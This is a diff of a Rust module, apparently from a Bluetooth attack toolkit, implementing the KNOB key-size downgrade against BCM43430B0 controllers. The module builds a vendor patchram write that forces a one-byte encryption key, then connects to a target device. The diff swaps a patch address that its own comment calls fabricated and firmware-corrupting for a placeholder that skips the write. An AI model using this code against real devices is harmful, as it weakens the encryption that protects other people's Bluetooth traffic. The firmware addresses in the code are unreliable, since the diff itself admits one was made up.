@@ -19,8 +19,10 @@ const CREATE_CONNECTION: u16 = 0x05;
 const WRITE_RAM: u16 = 0x4C;
 
 /// Patchram address for LMP key-size enforcement on BCM43430B0.
-/// This is the LMP handler dispatch entry that we patch to force min key size.
-const LMP_KEY_SIZE_PATCH_ADDR: u32 = 0x0021_3000;
+/// TODO: 0x0021_3000 was fabricated and sits in patchram data tables — will corrupt firmware.
+/// This address must be discovered at runtime by scanning the LMP handler dispatch table.
+/// Set to 0 so the guard below skips the write until a real address is found.
+const LMP_KEY_SIZE_PATCH_ADDR: u32 = 0x0000_0000;
 
 /// KNOB attack: force minimum encryption key size on a BR/EDR connection.
 ///
@@ -34,26 +36,37 @@ pub fn run(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
 
     // Step 1: Write patchram to force minimum key size in LMP negotiation.
     // The patch bytes set the key_size_req response to 1 byte.
-    let patch_payload: [u8; 4] = [0x01, 0x00, 0x00, 0x00]; // key_size = 1
-    let mut ram_params = Vec::with_capacity(8);
-    ram_params.extend_from_slice(&LMP_KEY_SIZE_PATCH_ADDR.to_le_bytes());
-    ram_params.push(patch_payload.len() as u8);
-    ram_params.extend_from_slice(&patch_payload);
+    //
+    // Skip if LMP_KEY_SIZE_PATCH_ADDR is 0 (placeholder) — the real address
+    // must be discovered at runtime by scanning the firmware's LMP dispatch table.
+    if LMP_KEY_SIZE_PATCH_ADDR == 0 {
+        log::info!(
+            "knob: LMP_KEY_SIZE_PATCH_ADDR is 0 (placeholder) — skipping patchram write. \
+             Address must be discovered at runtime."
+        );
+    } else {
+        let patch_payload: [u8; 4] = [0x01, 0x00, 0x00, 0x00]; // key_size = 1
+        // Write RAM (0xFC4C) format: [addr_le32][data...] — no explicit length byte;
+        // the HCI packet header encodes the parameter length.
+        let mut ram_params = Vec::with_capacity(8);
+        ram_params.extend_from_slice(&LMP_KEY_SIZE_PATCH_ADDR.to_le_bytes());
+        ram_params.extend_from_slice(&patch_payload);
 
-    let patch_cmd = HciCommand::vendor(WRITE_RAM, ram_params);
-    if let Err(e) = hci.send_command(&patch_cmd) {
-        log::info!("knob: patchram write failed: {}", e);
-        return BtAttackResult {
-            attack_type: BtAttackType::Knob,
-            target_address: target_addr.to_string(),
-            target_name: None,
-            success: false,
-            capture: None,
-            error: Some(format!("patchram write failed: {}", e)),
-            timestamp: start,
-        };
+        let patch_cmd = HciCommand::vendor(WRITE_RAM, ram_params);
+        if let Err(e) = hci.send_command(&patch_cmd) {
+            log::info!("knob: patchram write failed: {}", e);
+            return BtAttackResult {
+                attack_type: BtAttackType::Knob,
+                target_address: target_addr.to_string(),
+                target_name: None,
+                success: false,
+                capture: None,
+                error: Some(format!("patchram write failed: {}", e)),
+                timestamp: start,
+            };
+        }
+        log::info!("knob: patchram written at 0x{:08X}", LMP_KEY_SIZE_PATCH_ADDR);
     }
-    log::info!("knob: patchram written at 0x{:08X}", LMP_KEY_SIZE_PATCH_ADDR);
 
     // Step 2: Initiate BR/EDR connection.
     // HCI_Create_Connection parameters:
